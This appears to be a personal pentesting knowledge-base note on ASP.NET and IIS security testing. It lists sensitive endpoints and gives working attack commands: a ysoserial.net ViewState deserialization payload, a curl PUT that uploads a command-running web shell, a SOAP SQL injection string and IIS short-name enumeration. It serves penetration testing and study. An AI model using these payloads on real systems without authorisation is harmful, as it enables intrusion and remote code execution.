---
title: "ASP.NET Security Testing"
type: technique
tags: [aspnet, dotnet, iis, viewstate, debug, security-testing]
date_created: 2026-08-17
date_updated: 2026-08-17
sources: []
related: ["[[sqli]]", "[[information-disclosure]]"]
status: active
---

# ASP.NET Security Testing

## Reconnaissance

```bash
# Identify ASP.NET
# Headers: X-Powered-By: ASP.NET, X-AspNet-Version: 4.0.x
# Extensions: .aspx, .ashx, .asmx, .svc, .cshtml
# Cookies: .ASPXAUTH, ASP.NET_SessionId

# Via headers on any request:
curl -I https://target.com/ | grep -i "asp\|x-powered"
```

## Sensitive endpoints

```
# Debug/Info
/trace.axd          # Application trace (request log)
/elmah.axd          # ELMAH error log (may contain credentials, PII)
/ScriptResource.axd # JS resources (may leak paths)
/_debugbar/         # Debug bar (never in production)
/__ELMAH.ERR        # errors

# Web services
/Service.asmx       # SOAP web services
/.svc               # WCF services

# Config leaks
/web.config         # config (should return 403)
/appsettings.json   # .NET Core config
/ConnectionStrings.config
```

## ViewState attacks

```bash
# 1. Identify ViewState in pages
# <input type="hidden" name="__VIEWSTATE" value="/wEPDwUK...">

# 2. Check whether MAC is enabled
# Use a viewstate decoder to inspect

# 3. If enableViewStateMac=false -> inject a malicious object
# ysoserial.net to generate the payload
ysoserial.exe -f LosFormatter -g TextFormattingRunProperties \
    -c "whoami" -o base64

# 4. Submit via the __VIEWSTATE field
```

## IIS specific

```bash
# IIS Short Name Enumeration (IIS 7.5 and below)
# Guess 8.3 file names
curl "https://target.com/~1*/.aspx"  # 404 vs 400 differentiates

# IIS tilde scanning with iis-shortname-scanner.jar
java -jar iis-shortname-scanner.jar 2 20 https://target.com/

# PUT method (IIS WebDAV)
curl -X PUT https://target.com/uploads/shell.aspx --data '<%@ Page Language="C#" %><% var proc = System.Diagnostics.Process.Start("cmd.exe","/c id"); %>'

# HTTP methods
OPTIONS https://target.com/
# PUT, DELETE enabled?
```

## Status / monitoring endpoints

```bash
# .NET Core Health Checks
/health
/api/health
/metrics           # Prometheus metrics
/status
/actuator          # Spring Boot but sometimes ASP.NET too

# ELMAH, error logging
/elmah.axd  # may list exceptions with full stack traces
# Stack trace reveals: absolute paths, framework versions, SQL queries
```

## Deserialization (SOAP/XML)

```bash
# WCF services with NetDataContractSerializer
# asmx services with ObjectStateFormatter

# Testing for SQL Injection in SOAP parameters
POST /Service.asmx HTTP/1.1
Content-Type: text/xml
SOAPAction: "MethodName"

<soap:Envelope>
  <soap:Body>
    <MethodName>
      <param>1' OR '1'='1</param>
    </MethodName>
  </soap:Body>
</soap:Envelope>
```

## ConnectionStrings leak

```xml
<!-- If web.config is exposed: -->
<connectionStrings>
    <add name="DefaultConnection"
         connectionString="Server=db.internal;Database=prod;User=sa;Password=S3cr3t!"/>
</connectionStrings>
```

## Tools
- HTTP proxy, for proxy and analysis
- ysoserial.net, deserialization payloads
- iis-shortname-scanner
- DotDotPwn, path traversal scanner

## References
- OWASP ASP.NET / IIS testing guidance
